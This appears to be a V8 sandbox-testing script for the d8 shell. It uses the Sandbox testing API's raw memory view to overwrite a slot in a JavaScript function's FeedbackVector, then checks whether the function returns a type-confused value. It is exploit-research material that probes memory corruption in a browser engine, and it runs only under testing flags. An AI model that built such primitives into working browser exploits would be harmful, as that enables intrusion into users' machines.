// C18 H39: valid bytecode, copy FeedbackVector[src] -> slot0.
// Usage: d8 --sandbox-testing --allow-natives-syntax h39...js -- <srcSlot>
const kHeapObjectTag = 0x1;
const kJSFunctionType = Sandbox.getInstanceTypeIdFor("JS_FUNCTION_TYPE");
const kJSFunctionFeedbackCellOffset =
    Sandbox.getFieldOffset(kJSFunctionType, "feedback_cell");
const kFeedbackCellType = Sandbox.getInstanceTypeIdFor("FEEDBACK_CELL_TYPE");
const kFeedbackCellValueOffset =
    Sandbox.getFieldOffset(kFeedbackCellType, "value");

let srcSlot = 4;
if (typeof arguments !== "undefined" && arguments.length > 0) {
  srcSlot = Number(arguments[0]);
}

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const getPtr = (obj) => Sandbox.getAddressOf(obj) + kHeapObjectTag;
const getField = (ptr, offset) =>
    memory.getUint32(ptr + offset - kHeapObjectTag, true);
const setField = (ptr, offset, value) =>
    memory.setUint32(ptr + offset - kHeapObjectTag, value, true);
const slotOffset = (slot) => 4 * (7 + slot);

var C18_H39_GLOBAL = 13;
function f() {
  return C18_H39_GLOBAL;
}

%EnsureFeedbackVectorForFunction(f);
for (let i = 0; i < 1000; i++) f();

let fp = getPtr(f);
let fc = getField(fp, kJSFunctionFeedbackCellOffset);
let fv = getField(fc, kFeedbackCellValueOffset);
let before = getField(fv, slotOffset(0));
let src = getField(fv, slotOffset(srcSlot));
setField(fv, slotOffset(0), src);

let r = f();
let box = {v: r};
print(`src=${srcSlot} before=0x${before.toString(16)} srcval=0x${src.toString(16)} same=${r === C18_H39_GLOBAL}`);
try {
  print("bool", Boolean(box.v));
} catch (e) {
  print("bool-throw", e.name + ":" + e.message);
}
try {
  print("tag", Object.prototype.toString.call(box.v));
} catch (e) {
  print("tag-throw", e.name + ":" + e.message);
}
